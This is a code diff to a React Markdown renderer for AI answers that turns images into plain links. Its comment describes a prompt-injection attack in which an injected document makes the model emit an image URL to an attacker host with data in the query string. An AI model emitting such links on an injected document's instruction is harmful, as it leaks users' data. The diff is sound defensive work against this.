@@ -17,6 +17,17 @@ export function MarkdownAnswer({ content, citations }: { content: string; citati
         remarkPlugins={[remarkGfm]}
         rehypePlugins={[rehypeHighlight]}
         components={{
+          // Never load images from an answer: a prompt-injected document could make the
+          // model emit ![](https://attacker/?data=...) and the browser would send it on
+          // render. Show the address as a link the user can choose to open.
+          img({ src, alt }) {
+            const url = typeof src === "string" ? src : "";
+            return (
+              <a href={url} target="_blank" rel="noreferrer noopener" title={url}>
+                [image{alt ? `: ${alt}` : ""}]
+              </a>
+            );
+          },
           a({ href, children }) {
             const number = citationNumber(href);
             if (number === null) {
